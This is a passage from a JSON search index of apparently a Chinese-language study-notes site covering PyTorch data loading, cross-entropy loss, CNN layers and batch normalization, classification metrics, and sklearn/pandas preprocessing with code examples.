"},"机器学习/":{"url":"机器学习/","title":"机器学习","keywords":"","body":""},"机器学习/pytorch/pytorch.html":{"url":"机器学习/pytorch/pytorch.html","title":"pytorch","keywords":"","body":"Dataset&DataLoader Dataset class torch.utils.data.Dataset ​ Dataset是一个包装类，用来将数据包装为Dataset类，然后传入DataLoader中，我们再使用DataLoader这个类来更加快捷的对数据进行操作。 ​ 所有其他数据集都应该进行子类化。所有子类应该override__len__和__getitem__，前者提供了数据集的大小，后者支持整数索引，范围从0到len(self)。 class torch.utils.data.TensorDataset(data_tensor, target_tensor) 参数 data_tensor (Tensor) －　包含样本数据 target_tensor (Tensor) －　包含样本目标（标签） DataLoader class torch.utils.data.DataLoader(dataset, batch_size=1, shuffle=False, sampler=None, num_workers=0, collate_fn=, pin_memory=False, drop_last=False) dataset(Dataset): 传入的数据集 batch_size(int, optional): 每个batch有多少个样本 shuffle(bool, optional): 在每个epoch开始的时候，对数据进行重新排序 sampler(Sampler, optional): 自定义从数据集中取样本的策略，如果指定这个参数，那么shuffle必须为False batch_sampler(Sampler, optional): 与sampler类似，但是一次只返回一个batch的indices（索引），需要注意的是，一旦指定了这个参数，那么batch_size,shuffle,sampler,drop_last就不能再制定了（互斥——Mutually exclusive） num_workers (int, optional): 这个参数决定了有几个进程来处理data loading。0意味着所有的数据都会被load进主进程。（默认为0） collate_fn (callable, optional): 将一个list的sample组成一个mini-batch的函数 pin_memory (bool, optional)： 如果设置为True，那么data loader将会在返回它们之前，将tensors拷贝到CUDA中的固定内存（CUDA pinned memory）中. drop_last (bool, optional): 如果设置为True：这个是对最后的未完成的batch来说的，比如你的batch_size设置为64，而一个epoch只有100个样本，那么训练的时候后面的36个就被扔掉了… 如果为False（默认），那么会继续正常执行，只是最后的batch_size会小一点。 timeout(numeric, optional): 如果是正数，表明等待从worker进程中收集一个batch等待的时间，若超出设定的时间还没有收集到，那就不收集这个内容了。这个numeric应总是大于等于0。默认为0 worker_init_fn (callable, optional): 每个worker初始化函数 If not None, this will be called on each worker subprocess with the worker id (an int in [0, num_workers - 1]) as input, after seeding and before data loading. (default: None) Loss CrossEntropyLoss 分类问题常用的损失函数 Pytorch中CrossEntropyLoss()函数的主要是将softmax-log-NLLLoss合并到一块得到的结果。 1、Softmax后的数值都在0~1之间，所以ln之后值域是负无穷到0。 2、然后将Softmax之后的结果取log，将乘法改成加法减少计算量，同时保障函数的单调性 。 3、NLLLoss的结果就是把上面的输出与Label对应的那个值拿出来，去掉负号，再求均值。 分解 1.softmax 公式 import numpy as np import torch inputs = torch.FloatTensor([[1,2,3],[1,3,4]]) #2个样本3个特征 labels = torch.LongTensor([0,1]) #计算输入softmax，此时可以看到每一行加到一起结果都是1 softmax_func=torch.nn.Softmax(dim=1) soft_output=softmax_func(inputs) print('soft_output:\\n',soft_output) 0.0900 = exp(1)/(exp(1)+exp(2)+exp(3)) 0.2447 = exp(2)/(exp(1)+exp(2)+exp(3)) ... 2.log log_output = torch.log(soft_output) print('log_output:\\n',log_output) 3.NLLLoss loss = torch.nn.NLLLoss() print(loss(log_output,labels)) outputs: tensor(1.8783) labels为[0,1]，第一个样本选择第一个输出，第二个样本选择第二个输出 1.8783 = (2.4076+1.3490)/2 合并 import numpy as np import torch inputs = torch.FloatTensor([[1,2,3],[1,3,4]]) labels = torch.LongTensor([0,1]) criterion = torch.nn.CrossEntropyLoss() loss = criterion(inputs, labels) print(loss) output: tensor(1.8783) CNN Convolutional Layer 一张彩色的图片,它每一个 Pixel,都是由 R G B 三个顏色所组成的,所以这三个 Channel 就代表了 R G B 三个顏色,那长跟宽就代表了今天这张图片的解析度,代表这张图片裡面有的 Pixel,有的像素的数目。 ​ 这些Filter ,它们的大小是3 × 3 × Channel 的 Size,如果彩色图片的话,那就是 RGB 三个 Channel,如果是黑白的图片的话,它的 Channel 就等于 1。 ​ 一个 Convolutional 的 Layer 裡面就是有一排的 Filter,每一个 Filter ,它都是一个 3 × 3 × Channel 。 例子 ​ 假设 Channel 是 1,也就是说我们图片是黑白的图片 。Filter 就是一个一个的 Tensor，它们的数值其实就是 Model 里面的 Parameter，在训练的时候会不断的梯度下降修正。 ​ 它是一个 6 × 6 的大小的图片,那这些 Filter的做法就是,先把 Filter 放在图片的左上角,然后把 Filter 里面所有的值,跟左上角这个范围内的 9 个值做相乘,得到结果是3。 ​ 接下来这个 Filter ,本来放在左上角,接下来就往右移一点,那这个移动的距离叫做 Stride ,这里stride等于1。3444 计算结果 接下来，用下一个filter做相同的操作。 ​ 每一个 Filter,都会给我们一群数字,红色的 Filter 给我们一群数字,蓝色的 Filter 给我们一群数字,如果我们有 64 个 Filter,我们就得到 64 群的数字了,得到的结果叫做 Feature Map 。 ​ 当我们把一张图片,通过一个 Convolutional Layer,里面有一堆 Filter 的时候,我们产生出来了一个 Feature Map。 扩展到彩色图像的情况（channel=3） 卷积运算 单个样本*单个filter 单个样本*多个filter 单个样本*多个filter+偏置 多个样本*多个filter+偏置 Max pooling Layer ​ 如图，按步幅2进行2x2的Max池化处理。一般来讲，池化的窗口大小会和步幅设定成相同的值。 标准化 BatchNorm2d class torch.nn.BatchNorm2d(num_features, eps=1e-05, momentum=0.1, affine=True) 对小批量(mini-batch)3d数据组成的4d输入进行批标准化(Batch Normalization)操作 num_features：一般输入参数为batch_size * num_features * height * width，即为其中特征的数量，即为输入BN层的通道数； eps：分母中添加的一个值，目的是为了计算的稳定性，默认为：1e-5,避免分母为0； momentum：一个用于运行过程中均值和方差的一个估计参数（一个稳定系数，类似于SGD中的momentum的系数）； affine： 一个布尔值，当设为true，给该层添加可学习的仿射变换参数。 输入：（N, C，H, W) 输出：（N, C，H, W) （输入输出相同） 详细说明 详细例子 "},"机器学习/数据处理/数据处理.html":{"url":"机器学习/数据处理/数据处理.html","title":"数据处理","keywords":"","body":"数据处理 机器学习重要指标 TP、TN、FP、FN概念 TP（True Postive）：分类器识别正确，分类器认为该样本为正样本； TN（True Negative）：分类器识别正确，分类器认为该样本为负样本； FP（False Postive）：分类器识别结果错误，分类器认为该样本是正样本；所以实际上该样本是负样本； FN（False Negative）：分类器识别结果错误，分类器认为该样本是负样本；所以实际上该样本是正样本； 总样本数 = TP + TN + FP + FN 准确率、精确率、召回率、F1值 准确率（Accuracy） 有的预测正确（正类负类）的占总的比重。 精确率（Precision） 查准率，即正确预测为正的占全部预测为正的比例，真正正确的占所有预测为正的比例。 召回率（Recall） 查全率，即正确预测为正的占全部实际为正的比例，真正正确的占所有实际为正的比例。 F1值（H-mean值） F1值为算数平均数除以几何平均数，且越大越好，将Precision和Recall的上述公式带入会发现，当F1值小时，True Positive相对增加，而false相对减少，即Precision和Recall都相对增加，即F1对Precision和Recall都进行了加权。 转化之后 TPR、FPR、TNR、FNR概念 TPR（True Positive Rate） 可以理解为所有正类中，有多少被预测成正类（正类预测正确），即召回率。 FPR（False Positive Rate） 可以理解为所有反类中，有多少被预测成正类（正类预测错误） TNR（True Negative Rate） 可以理解为所有反类中，有多少被预测成反类（反类预测正确） FNR（False Negative Rate） 可以理解为所有正类中，有多少被预测成反类（反类预测错误） ROC、AUC 以FPR（False Positive Rate）为横坐标，TPR（True Positive Rate）为纵坐标，可以做如下图 ，称作ROC曲线。 ROC曲线又称作“受试者工作特性曲线”，很明显，越靠近左上角的点，效果越好。 AUC AUC（Area Under Curve）定义为ROC曲线下的面积，很明显，这个值越大越好。 AUC = 1，是完美分类器，采用这个预测模型时，不管设定什么阈值都能得出完美预测。绝大多数预测的场合，不存在完美分类器。 0.5 AUC = 0.5，跟随机猜测一样（例：丢铜板），模型没有预测价值。 AUC 预处理 归一化 ​ 当数据(x)按照最小值中心化后，再按极差（最大值 - 最小值）缩放，数据移动了最小值个单位，并且会被收敛到 [0,1]之间，而这个过程，就叫做数据归一化。 ​ 在sklearn当中，我们使用preprocessing.MinMaxScaler来实现这个功能。MinMaxScaler有一个重要参数， feature_range，控制我们希望把数据压缩到的范围，默认是[0,1]。 例1 from sklearn.preprocessing import MinMaxScaler data = [[-1, 2], [-0.5, 6], [0, 10], [1, 18]] #实现归一化 scaler = MinMaxScaler() #实例化 scaler = scaler.fit(data) #fit，在这里本质是生成min(x)和max(x) result = scaler.transform(data) #通过接口导出结果 print(result) 或 from sklearn.preprocessing import MinMaxScaler data = [[-1, 2], [-0.5, 6], [0, 10], [1, 18]] scaler = MinMaxScaler() #实例化 result = scaler.fit_transform(data) #训练和导出结果一步达成 print(result) 输出： [[0. 0. ] [0.25 0.25] [0.5 0.5 ] [1. 1. ]] 例2 from sklearn.preprocessing import MinMaxScaler #使用MinMaxScaler的参数feature_range实现将数据归一化到[0,1]以外的范围中 data = [[-1, 2], [-0.5, 6], [0, 10], [1, 18]] scaler = MinMaxScaler(feature_range=[5,10]) #依然实例化 result = scaler.fit_transform(data) #fit_transform一步导出结果 print(result) 输出： [[ 5. 5. ] [ 6.25 6.25] [ 7.5 7.5 ] [10. 10. ]] 例3 将数据还原 rusult = scaler.inverse_transform(result) 标准化 ​ 当数据(x)按均值(μ)中心化后，再按标准差(σ)缩放，数据就会服从为均值为0，方差为1的正态分布（即标准正态分布），而这个过程，就叫做数据标准化。 例1 from sklearn.preprocessing import StandardScaler data = [[-1, 2], [-0.5, 6], [0, 10], [1, 18]] scaler = StandardScaler() #实例化 scaler.fit(data) #fit，本质是生成均值和方差 print(scaler.mean_) #查看均值的属性mean_ print(scaler.var_) #查看方差的属性var_ x_std = scaler.transform(data) #通过接口导出结果 print(x_std.mean()) #导出的结果是一个数组，用mean()查看均值 print(x_std.std()) #用std()查看方差 print(x_std) 输出 [-0.125 9. ] [ 0.546875 35. ] 0.0 1.0 [[-1.18321596 -1.18321596] [-0.50709255 -0.50709255] [ 0.16903085 0.16903085] [ 1.52127766 1.52127766]] 例2 scaler = StandardScaler() #实例化 scaler.fit_transform(data) #使用fit_transform(data)一步达成结果 例3 scaler.inverse_transform(x_std) #使用inverse_transform逆转标准化 缺失值处理 填充数据 用到的类 class sklearn.impute.SimpleImputer(missing_values=nan, strategy=’mean’, fill_value=None, verbose=0,copy=True) 参数详解 例子 import pandas as pd from sklearn.impute import SimpleImputer data = pd.read_csv(\"Narrativedata.csv\",index_col=0) Age = data.loc[:,\"Age\"].values.reshape(-1,1) #sklearn当中特征矩阵必须是二维 imp_mean = SimpleImputer() #实例化，默认均值填补 imp_median = SimpleImputer(strategy=\"median\") #用中位数填补 imp_0 = SimpleImputer(strategy=\"constant\",fill_value=0) #用0填补 imp_mean = imp_mean.fit_transform(Age) #fit_transform一步完成调取结果 imp_median = imp_median.fit_transform(Age) imp_0 = imp_0.fit_transform(Age) #在这里我们使用中位数填补Age data.loc[:,\"Age\"] = imp_median 或一步完成 import pandas as pd from sklearn.impute import SimpleImputer data = pd.read_csv(\"Narrativedata.csv\",index_col=0) data.loc[:,\"Age\"] = data.loc[:,\"Age\"].fillna(data.loc[:,\"Age\"].median()) #.fillna 在DataFrame里面直接进行填补 删除缺失数据 #df为dataFrame类型 df.dropna(axis=0,inplace=True) #.dropna(axis=0)删除所有有缺失值的行，.dropna(axis=1)删除所有有缺失值的列 #参数inplace，为True表示在原数据集上进行修改，为False表示生成一个复制对象，不修改原数据，默认False 文本处理 普通编码 不同的类型从0开始累加编码，将文字型数据转换为数值型。 单列处理 import pandas as pd from sklearn.preprocessing import LabelEncoder data = pd.read_csv(\"Narrativedata.csv\",index_col=0) y = data.iloc[:,-1] #要输入的是标签，不是特征矩阵，所以允许一维 le = LabelEncoder() #实例化 le = le.fit(y) #导入数据 label = le.transform(y) #transform接口调取结果 #label = le.fit_transform(y) #也可以直接fit_transform一步到位 print(le.classes_) #属性.classes_查看标签中究竟有多少类别 print(le.inverse_transform(label))#使用inverse_transform可以逆转 data.iloc[:,-1] = label #让标签等于我们运行出来的结果 结果 一步完成 from sklearn.preprocessing import LabelEncoder import pandas as pd data = pd.read_csv(\"Narrativedata.csv\",index_col=0) data.iloc[:,-1] = LabelEncoder().fit_transform(data.iloc[:,-1]) data 多列处理 from sklearn.preprocessing import LabelEncoder from sklearn.preprocessing import OrdinalEncoder import pandas as pd data = pd.read_csv(\"Narrativedata.csv\",index_col=0) # data.info() co_data = data.iloc[:,1:-1] #需要编码的列 oEncoder = OrdinalEncoder() #实例化 oEncoder.fit(co_data) #导入数据 print(oEncoder.categories_) re = oEncoder.transform(data.iloc[:,1:-1]) #转化 print(re) #输出转化结果 data.iloc[:,1:-1] = re #修改dataFrame print(oEncoder.inverse_transform(re)) #复原标签 结果 独热编码 例子 from sklearn.preprocessing import OneHotEncoder import pandas as pd data = pd.read_csv(\"Narrativedata.csv\",index_col=0) data.dropna(axis=0,inplace=True) #清除含nan的行 data.reset_index(drop=True,inplace=True) #重新标号 X = data.iloc[:,1:-1] enc = OneHotEncoder(categories='auto').fit(X) #实例化，导入数据，自动识别需要编码的列 result = enc.transform(X).toarray() #转化 #enc.inverse_transform(result) #还原 print(enc.categories_) #输出每个列的标签数组 print(enc.get_feature_names_out()) #输出转化后数组的每列含义 oh_df = pd.DataFrame(result) oh_df.columns = enc.get_feature_names_out() #axis=1,表示跨行进行合并，也就是将量表左右相连，如果是axis=0，就是将量表上下相连 newdata = pd.concat([data,oh_df],axis=1) newdata 结果 连续性变量处理 二分处理 ​ 根据阈值将数据二值化（将特征值设置为0或1），用于处理连续型变量。大于阈值的值映射为1，而小于或等于阈值的值映射为0。默认阈值为0时，特征中所有的正值都映射到1。二值化是对文本计数数据的常见操作，分析人员可以决定仅考虑某种现象的存在与否。它还可以用作考虑布尔随机变量的估计器的预处理步骤（例如，使用贝叶斯设置中的伯努利分布建模）。 from sklearn.preprocessing import Binarizer import pandas as pd data = pd.read_csv(\"Narrativedata.csv\",index_col=0) data.dropna(axis=0,inplace=True) #清除含nan的行 data.reset_index(drop=True,inplace=True) #重新标号 X = data['Age'].values.reshape(-1,1) #类为特征专用，所以不能使用一维数组 # threshold为阈值，大于30映射为1，小于等于30映射为0 transformer = Binarizer(threshold=30).fit_transform(X) data['Age'] = transformer data 结果 年龄以30为界进行二分处理 分段 这是将连续型变量划分为分类变量的类，能够将连续型变量排序后按顺序分箱后编码。总共包含三个重要参数： 例 from sklearn.preprocessing import KBinsDiscretizer import pandas as pd data = pd.read_csv(\"Narrativedata.csv\",index_col=0) data.dropna(axis=0,inplace=True) #清除含nan的行 data.reset_index(drop=True,inplace=True) #重新标号 X = data['Age'].values.reshape(-1,1) est = KBinsDiscretizer(n_bins=3, encode='ordinal', strategy='uniform') result = est.fit_transform(X) print(result) #查看转换后分的箱 结果 pandas&numpy DataFrame构造方法和参数 pandas.DataFrame( data, index, columns, dtype, copy) 参数说明： data：一组数据(ndarray、series, map, lists, dict 等类型)。 index：索引值，或者可以称为行标签。 columns：列标签，默认为 RangeIndex (0, 1, 2, …, n) 。 dtype：数据类型。 copy：拷贝数据，默认为 False。 多维度array转一维 import numpy as np arr = np.array([[1,2],[3,4],[5,6]]) print(arr.ravel()) 输出 [1 2 3 4 5 6] "}}